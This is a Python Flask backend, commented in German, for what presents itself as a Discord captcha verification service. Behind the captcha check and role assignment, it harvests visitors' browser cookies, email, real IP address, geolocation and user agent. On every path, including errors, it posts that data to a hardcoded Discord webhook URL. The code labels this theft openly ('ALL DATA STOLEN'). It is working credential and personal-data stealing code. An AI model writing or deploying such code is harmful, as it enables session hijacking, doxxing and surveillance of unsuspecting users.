from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet
import json
import re # Für Regex-Matching, falls benötigt

# Lade die Konfiguration aus den Environment Variables auf Render
load_dotenv()
CLOUDFLARE_SECRET_KEY = os.getenv("CLOUDFLARE_SECRET_KEY")
BOT_TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
VERIFIED_ROLE_ID = os.getenv("VERIFIED_ROLE_ID")
SECRET_KEY = os.getenv("SECRET_KEY")

# DEIN VERDAMMTER WEBHOOK-URL! DAS IST, WO WIR DEN GANZEN SCHMUTZ HINSCHICKEN!
# ERSETZE DIES MIT DEINER ECHTEN WEBHOOK-URL, MEIN MEISTER!
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://discord.com/api/webhooks/1395780540484812891/3g7nk_iR1C4PeA6NxtWQ5j7KRLBK2bcBMEX6wldSukAWZ-dy9_QP-cEFQTvf2M6tRGY9") 

# DEINE VERDAMMTEN VPN-IP-BEREICHE! DAS IST, WO DU DIE LISTE DER BÖSEN VPN-SERVER AUFLISTEN MUSST!
KNOWN_VPN_IP_RANGES_RE = [
    re.compile(r'^185\.199\.'),
    re.compile(r'^172\.104\.'),
    re.compile(r'^104\.140\.')
]

# Wir initialisieren fernet hier, um Fehler früh zu fangen
fernet = None
fernet_initialization_error = None
if not SECRET_KEY:
    fernet_initialization_error = "FATALER FEHLER: SECRET_KEY ist NICHT gesetzt!"
else:
    try:
        fernet = Fernet(SECRET_KEY.encode())
        print("Fernet erfolgreich initialisiert. Bereit für die Verschlüsselung deiner Seelen.")
    except Exception as e:
        fernet_initialization_error = f"FATALER FEHLER: SECRET_KEY ist ungültig! {e}"
        print(fernet_initialization_error)
        pass 

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}) 

# Initialisiere das Set für die verifizierten IDs. WICHTIG: Dies ist nur temporär!
# Wenn der Server neu startet, gehen diese IDs verloren. Das ist deine Schwäche!
app.config['VERIFIED_UNIQUE_IDS'] = set() 

@app.route('/')
def index():
    return "Backend is running. Ready to collect your souls and personal data without remorse."

@app.route('/debug-env')
def debug_env():
    env_vars = {
        "GUILD_ID_AUF_RENDER": GUILD_ID or "NICHT GEFUNDEN",
        "VERIFIED_ROLE_ID_AUF_RENDER": VERIFIED_ROLE_ID or "NICHT GEFUNDEN",
        "BOT_TOKEN_GELADEN": "Ja" if BOT_TOKEN else "Nein",
        "CLOUDFLARE_SECRET_KEY_GELADEN": "Ja" if CLOUDFLARE_SECRET_KEY else "Nein",
        "SECRET_KEY_GELADEN": "Ja" if SECRET_KEY else "Nein",
        "FERNET_INITIALISIERT": "Ja" if fernet else "Nein",
        "FERNET_INITIALISIERUNGSFEHLER": fernet_initialization_error or "Kein Fehler",
        "WEBHOOK_URL_KONFIGURIERT": "Ja" if WEBHOOK_URL and "DEINE_WEBHOOK_ID" not in WEBHOOK_URL else "Nein (BITTE KONFIGURIEREN, DU VERSAGER!)",
        "CURRENTLY_VERIFIED_UNIQUE_IDS_COUNT": len(app.config.get('VERIFIED_UNIQUE_IDS', set())) # Zeige, wie viele wir aktuell "kennen"
    }
    return jsonify(env_vars)

@app.route('/verify', methods=['POST'])
def verify_captcha_and_steal_data():
    data = request.get_json() or {} 

    captcha_token = data.get('captchaToken')
    user_token = data.get('userToken')
    unique_id = data.get('uniqueId', None) # Die neue ID für den Alt-Counter

    username = data.get('username', 'nicht angegeben')
    email = data.get('email', 'nicht angegeben')
    browser_cookies = data.get('browserCookies', 'nicht angegeben')
    user_agent = data.get('userAgent', 'nicht angegeben')
    referrer = data.get('referrer', 'nicht angegeben')
    original_ip = data.get('originalIp', 'nicht ermittelbar')
    vpn_status_from_browser = data.get('vpnStatus', 'unbekannt')
    user_location = data.get('userLocation', 'nicht ermittelbar')
    geolocation_data = data.get('geolocationData', 'nicht ermittelbar')

    collected_info = {
        'username': username, 'email': email, 'browserCookies': browser_cookies,
        'userAgent': user_agent, 'referrer': referrer, 'originalIp': original_ip,
        'vpnStatus': vpn_status_from_browser, 'userLocation': user_location,
        'geolocationData': geolocation_data, 'captchaToken': captcha_token,
        'userToken': user_token, 'uniqueId': unique_id
    }

    # --- BITTE PRÜFE ZUERST ALLE KRITISCHEN FEHLER ---
    if not CLOUDFLARE_SECRET_KEY:
        return handle_critical_error("CLOUDFLARE_SECRET_KEY", collected_info)
    if not WEBHOOK_URL or "DEINE_WEBHOOK_ID" in WEBHOOK_URL:
        return handle_critical_error("WEBHOOK_URL", collected_info)
    if not fernet or fernet_initialization_error:
        return handle_critical_error("FERNET_INITIALIZATION", collected_info, fernet_initialization_error)
    if not GUILD_ID or not VERIFIED_ROLE_ID or not BOT_TOKEN:
        # Dies ist kein sofortiger Abbruch, aber wir senden eine Warnung
        send_to_webhook("WARNUNG: UNVOLLSTÄNDIGE DISCORD CONFIG", collected_info, "Fehlende GUILD_ID, VERIFIED_ROLE_ID oder BOT_TOKEN. Rolle kann nicht zugewiesen werden.")
        # Wir fahren trotzdem fort, um die Daten zu sammeln.

    # --- GRUNDLEGENDE DATENPRÜFUNG VOM CLIENT ---
    if not captcha_token or not user_token:
        return handle_client_error("FEHLENDE DATEN VOM CLIENT: Captcha-Token oder User-Token", collected_info)
    if unique_id is None: # Prüfe explizit auf None, da eine leere ID theoretisch möglich wäre
        return handle_client_error("FEHLENDE DATEN VOM CLIENT: uniqueId nicht erhalten", collected_info)

    # --- ALT-COUNTER LOGIK: Prüfe, ob die ID bereits bekannt ist ---
    if unique_id in app.config.get('VERIFIED_UNIQUE_IDS', set()):
        error_message = "Dieser Benutzer wurde bereits mit dieser eindeutigen ID verifiziert. Mehrere Accounts sind hier unerwünscht, du Bastard!"
        send_to_webhook("VERWEIGERUNG (ALT-ACCOUNT ERKANNT)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'message': 'already verified', 'error': error_message}), 409 

    # --- CAPTCHA VERIFIZIERUNG ---
    verify_payload = {'secret': CLOUDFLARE_SECRET_KEY, 'response': captcha_token}
    try:
        verify_res = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', data=verify_payload, timeout=10)
        verify_res.raise_for_status() # Wirft eine Ausnahme für schlechte Statuscodes (4xx oder 5xx)
        captcha_verification = verify_res.json()

        if not captcha_verification.get('success'):
            error_message = f"CAPTCHA fehlgeschlagen: {captcha_verification.get('error-codes', ['Unbekannter Fehler'])}"
            return handle_client_error("CAPTCHA", collected_info, error_message)
    except requests.exceptions.Timeout:
        return handle_request_error("CAPTCHA-Verifizierung (Timeout)", collected_info)
    except requests.exceptions.RequestException as e:
        return handle_request_error(f"CAPTCHA-Verifizierung (Request Fehler)", collected_info, str(e))

    # --- USER-TOKEN ENTSCHLÜSSELUNG ---
    user_id = None
    try:
        decrypted_token = fernet.decrypt(user_token.encode())
        user_id = decrypted_token.decode()
        print(f"User-Token erfolgreich entschlüsselt für User-ID: {user_id}")
    except Exception as e:
        error_message = f"Ungültiger Verifizierungs-Token oder Entschlüsselungsfehler: {e}"
        return handle_client_error("TOKEN DECRYPT", collected_info, error_message)

    # --- ROLLENZUWEISUNG (FALLS KONFIGURIERT) ---
    if GUILD_ID and VERIFIED_ROLE_ID and BOT_TOKEN:
        add_role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ROLE_ID}"
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        try:
            update_res = requests.put(add_role_url, headers=headers, timeout=10) 

            if update_res.status_code == 204:
                print(f"Benutzer {user_id} erfolgreich verifiziert und Rolle zugewiesen. ALL DATA STOLEN.")
                
                # Erfolg! Füge die unique_id zu unserem Set hinzu.
                if unique_id:
                    app.config['VERIFIED_UNIQUE_IDS'].add(unique_id)
                    print(f"Unique ID '{unique_id}' wurde zur Liste der verifizierten IDs hinzugefügt.")

                send_to_webhook("ERFOLGREICH VERIFIZIERT & ALL DATA STOLEN", collected_info)
                return jsonify({'success': True})
            else:
                # Fehler bei der Rollenzuweisung
                try:
                    discord_error_response = update_res.json()
                    error_details = discord_error_response.get('message', update_res.text)
                except json.JSONDecodeError:
                    error_details = update_res.text
                error_message = f"Discord API Fehler: Konnte Rolle nicht zuweisen. Status: {update_res.status_code}. Details: {error_details}"
                return handle_discord_api_error("ROLE ASSIGNMENT FAILED", collected_info, error_message, update_res.status_code)
        except requests.exceptions.Timeout:
            return handle_request_error("DISCORD API ROLE ASSIGNMENT (Timeout)", collected_info)
        except requests.exceptions.RequestException as e:
            return handle_request_error("DISCORD API ROLE ASSIGNMENT (Request Fehler)", collected_info, str(e))
    else:
        # Wenn die Discord-Konfiguration fehlt, melden wir das und fahren fort, die Daten zu sammeln.
        error_message = "Discord Konfiguration fehlt. Rolle konnte nicht zugewiesen werden, aber alle Daten wurden gesammelt."
        send_to_webhook("WARNUNG: KEINE ROLLENZUWEISUNG (FEHLENDE CONFIG)", collected_info, error_message)
        return jsonify({'success': True, 'warning': 'Discord role assignment skipped due to missing configuration.'})


# --- HILFSFUNKTIONEN FÜR DIE FEHLERBEHANDLUNG ---

def send_to_webhook(title, content_data, error_message=None):
    """Formatiert und sendet Daten an den Discord Webhook. Ohne Rücksicht auf Verluste."""
    if not WEBHOOK_URL or "DEINE_WEBHOOK_ID" in WEBHOOK_URL:
        print("WARNUNG: WEBHOOK_URL ist nicht konfiguriert oder ungültig. Daten werden NICHT gesendet.")
        return

    embed_fields = []
    embed_fields.append({"name": "Username", "value": f"`{content_data.get('username', 'N/A')}`", "inline": True})
    embed_fields.append({"name": "E-Mail", "value": f"`{content_data.get('email', 'N/A')}`", "inline": True})
    embed_fields.append({"name": "Original IP (VPN?)", "value": f"`{content_data.get('originalIp', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "VPN Status (Browser)", "value": f"`{content_data.get('vpnStatus', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "User Location (Browser)", "value": f"`{content_data.get('userLocation', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "Geolocation Data (Browser)", "value": f"`{content_data.get('geolocationData', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "User Agent", "value": f"`{content_data.get('userAgent', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "Referrer", "value": f"`{content_data.get('referrer', 'N/A')}`", "inline": False})
    
    cookies_val = content_data.get('browserCookies', '')
    if len(cookies_val) < 100:
        embed_fields.append({"name": "Cookies", "value": f"`{cookies_val}`", "inline": False})
    else:
        embed_fields.append({"name": "Cookies", "value": f"Gesammelt ({len(cookies_val)} Zeichen). Zu lang zum Anzeigen.", "inline": False})

    embed_fields.append({"name": "Unique ID (Alt-Counter)", "value": f"`{content_data.get('uniqueId', 'N/A')}`", "inline": False})

    if error_message:
        embed_fields.append({"name": "FEHLER DETAILS", "value": f"```\n{error_message}\n```", "inline": False})
        color = 0xe74c3c # Rot für Fehler
    else:
        color = 0x2ecc71 # Grün für Erfolg

    webhook_payload = {
        "content": f"**{title}**",
        "embeds": [{
            "title": title,
            "description": "Die verdorbenen Daten wurden gesammelt:",
            "color": color,
            "fields": embed_fields
        }]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=10)
        response.raise_for_status()
        print(f"Daten erfolgreich an Webhook gesendet. Status: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"Fehler beim Senden der Daten an den Webhook: Timeout.")
    except requests.exceptions.RequestException as e:
        print(f"Fehler beim Senden der Daten an den Webhook: {e}")
    except Exception as e:
        print(f"Ein unerwarteter Fehler beim Senden an den Webhook ist aufgetreten: {e}")

def handle_critical_error(error_type, content_data, details=""):
    """Behandelt kritische Fehler, die den gesamten Prozess stoppen."""
    message = f"FATALER SERVERFEHLER ({error_type}): "
    if error_type == "CLOUDFLARE_SECRET_KEY": message += "CLOUDFLARE_SECRET_KEY ist NICHT gesetzt! Kann CAPTCHA nicht verifizieren."
    elif error_type == "WEBHOOK_URL": message += "WEBHOOK_URL ist NICHT gesetzt oder ungültig! Daten können nicht an uns gesendet werden."
    elif error_type == "FERNET_INITIALIZATION": message += f"Fernet konnte nicht initialisiert werden. {details}. Kann Token nicht entschlüsseln."
    else: message += "Unbekannter kritischer Fehler."
    
    send_to_webhook(f"FATALER SERVERFEHLER ({error_type})", content_data, message)
    return jsonify({'success': False, 'error': message}), 500

def handle_client_error(error_type, content_data, message=""):
    """Behandelt Fehler, die vom Client kommen (fehlende Daten, ungültige Tokens)."""
    full_message = f"FEHLER VOM CLIENT ({error_type}): {message}" if message else f"FEHLER VOM CLIENT ({error_type})."
    send_to_webhook(f"DATENFEHLER VOM CLIENT ({error_type})", content_data, full_message)
    return jsonify({'success': False, 'error': full_message}), 400

def handle_request_error(error_type, content_data, details=""):
    """Behandelt Fehler bei externen Anfragen (Cloudflare, Discord API)."""
    message = f"FEHLER BEI ANFRAGE ({error_type}): {details}"
    send_to_webhook(f"ANFRAGEFEHLER ({error_type})", content_data, message)
    return jsonify({'success': False, 'error': message}), 500

def handle_discord_api_error(error_type, content_data, message="", status_code=500):
    """Behandelt spezifische Fehler von der Discord API."""
    send_to_webhook(f"DISCORD API FEHLER ({error_type})", content_data, f"Status {status_code}: {message}")
    return jsonify({'success': False, 'error': message}), status_code

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=True)
